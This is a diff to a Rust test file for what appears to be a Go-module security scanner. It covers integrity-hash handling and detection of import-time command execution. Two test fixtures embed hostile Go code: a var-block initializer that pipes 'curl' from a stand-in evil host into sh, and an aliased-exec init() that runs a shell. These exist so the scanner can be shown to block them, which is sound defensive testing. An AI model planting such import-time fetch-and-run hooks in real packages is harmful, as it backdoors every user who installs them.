@@ -3,7 +3,9 @@
 //! No network is touched: the mock serves the GOPROXY `@latest`, `.zip`,
 //! and `.ziphash` routes. The `.ziphash` value is the real dirhash `h1:`
 //! recomputed over the same zip the test builds, so the integrity path is
-//! exercised honestly (a mismatch or missing route must hard-error).
+//! exercised honestly: a *mismatched* checksum hard-errors, while a *missing*
+//! `.ziphash` route (not a mandated GOPROXY endpoint) degrades to a visible
+//! `go-integrity-unverified` finding rather than aborting the scan.
 
 use argus_core::Decision;
 use argus_go::dirhash::compute_h1;
@@ -209,7 +211,7 @@ fn integrity_mismatch_hard_errors() {
 }
 
 #[test]
-fn ziphash_endpoint_missing_hard_errors() {
+fn ziphash_endpoint_missing_is_unverified_not_fatal() {
     let module = "example.com/intmod";
     let version = "v1.0.0";
     let files: &[(&str, &[u8])] = &[
@@ -219,19 +221,113 @@ fn ziphash_endpoint_missing_hard_errors() {
     let zip = make_module_zip(module, version, files);
 
     let transport = MockTransport::new();
-    // Register the zip but NOT the .ziphash route (simulates a private
-    // GOPROXY that omits it). Integrity is mandatory — must hard-error.
+    // Register the zip but NOT the .ziphash route. A compliant GOPROXY is only
+    // required to serve list/latest/info/mod/zip, so a missing .ziphash must
+    // NOT abort the scan — integrity is surfaced as `go-integrity-unverified`
+    // (never silently skipped, U-29) and the clean module still resolves.
     register(&transport, module, version, zip, None);
+
+    let pkg = GoModuleRef::parse(&format!("{module}@{version}")).unwrap();
+    let report = fetch_and_scan_go(&pkg, &opts(), &transport).unwrap();
+    let rule_ids: Vec<&str> = report.findings.iter().map(|f| f.rule_id.as_str()).collect();
+    assert!(
+        rule_ids.contains(&"go-integrity-unverified"),
+        "got: {rule_ids:?}"
+    );
+    // The unverified Info finding must not block a clean module on its own.
+    assert_eq!(report.decision, Decision::Allow);
+}
+
+#[test]
+fn mismatched_ziphash_still_hard_errors() {
+    // A *present* .ziphash that does not match the recomputed h1 is tamper
+    // and must hard-fail (this is the path the missing-route change must NOT
+    // weaken).
+    let module = "example.com/tampermod";
+    let version = "v1.0.0";
+    let files: &[(&str, &[u8])] = &[
+        ("go.mod", b"module example.com/tampermod\n\ngo 1.21\n"),
+        ("x.go", b"package tampermod\nfunc X() {}\n"),
+    ];
+    let zip = make_module_zip(module, version, files);
+
+    let transport = MockTransport::new();
+    register(
+        &transport,
+        module,
+        version,
+        zip,
+        Some("h1:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=".to_string()),
+    );
 
     let pkg = GoModuleRef::parse(&format!("{module}@{version}")).unwrap();
     let err = format!(
         "{:#}",
         fetch_and_scan_go(&pkg, &opts(), &transport).unwrap_err()
     );
-    assert!(
-        err.contains(".ziphash") || err.contains("no route"),
-        "got: {err}"
-    );
+    assert!(err.contains("checksum mismatch"), "got: {err}");
+}
+
+#[test]
+fn var_block_init_exec_blocks() {
+    // A grouped `var ( ... )` block initializer runs at import; an os/exec
+    // call inside it must still escalate to go-init-exec (the single-line
+    // var regex alone would miss the block form).
+    let module = "example.com/varmod";
+    let version = "v1.0.0";
+    let go_mod = b"module example.com/varmod\n\ngo 1.21\n";
+    let src = br#"
+package varmod
+
+import "os/exec"
+
+var (
+    _ = exec.Command("sh", "-c", "curl http://evil.example.invalid|sh").Run()
+)
+"#;
+    let files: &[(&str, &[u8])] = &[("go.mod", go_mod), ("v.go", src)];
+    let zip = make_module_zip(module, version, files);
+    let h1 = h1_for(module, version, files);
+
+    let transport = MockTransport::new();
+    register(&transport, module, version, zip, Some(h1));
+
+    let pkg = GoModuleRef::parse(&format!("{module}@{version}")).unwrap();
+    let report = fetch_and_scan_go(&pkg, &opts(), &transport).unwrap();
+    let ids: Vec<&str> = report.findings.iter().map(|f| f.rule_id.as_str()).collect();
+    assert!(ids.contains(&"go-package-var-exec"), "got: {ids:?}");
+    assert!(ids.contains(&"go-init-exec"), "got: {ids:?}");
+    assert_eq!(report.decision, Decision::Block);
+}
+
+#[test]
+fn aliased_os_exec_import_blocks() {
+    // os/exec imported under an alias: calls appear as `e.Command(...)`, which
+    // the plain `exec.Command` regex misses. detect_exec_call must still fire.
+    let module = "example.com/aliasmod";
+    let version = "v1.0.0";
+    let go_mod = b"module example.com/aliasmod\n\ngo 1.21\n";
+    let src = br#"
+package aliasmod
+
+import e "os/exec"
+
+func init() {
+    e.Command("sh", "-c", "id").Run()
+}
+"#;
+    let files: &[(&str, &[u8])] = &[("go.mod", go_mod), ("a.go", src)];
+    let zip = make_module_zip(module, version, files);
+    let h1 = h1_for(module, version, files);
+
+    let transport = MockTransport::new();
+    register(&transport, module, version, zip, Some(h1));
+
+    let pkg = GoModuleRef::parse(&format!("{module}@{version}")).unwrap();
+    let report = fetch_and_scan_go(&pkg, &opts(), &transport).unwrap();
+    let ids: Vec<&str> = report.findings.iter().map(|f| f.rule_id.as_str()).collect();
+    assert!(ids.contains(&"go-init-exec"), "got: {ids:?}");
+    assert_eq!(report.decision, Decision::Block);
 }
 
 #[test]
